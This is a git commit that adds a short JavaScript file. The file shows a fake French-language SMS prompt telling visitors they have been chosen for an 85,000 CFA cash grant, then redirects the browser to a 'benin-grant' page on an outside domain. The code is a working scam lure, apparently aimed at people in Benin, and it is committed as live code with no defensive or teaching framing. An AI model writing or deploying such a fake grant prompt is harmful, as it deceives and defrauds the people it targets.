efcf2017b9e1b8fd235cb3da7584ff48a0682f56
ekpeowo <ukpehansi@gmail.com>
2025-07-25 09:21:24 +0100

    Create active-benin.js

---
+++ active-benin.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 85 000 CFA'
+password=prompt('SMS: Félicitations, vous êtes parmi les sélectionnés pour recevoir une subvention en espèces de 85 000 CFA, cliquez sur OK pour vérifier ','RETIRER 85 000 CFA');
+if (password != 'RETIRER 85 000 CFA') {
+location.href='https://news-active.org/benin-grant.html';
+}
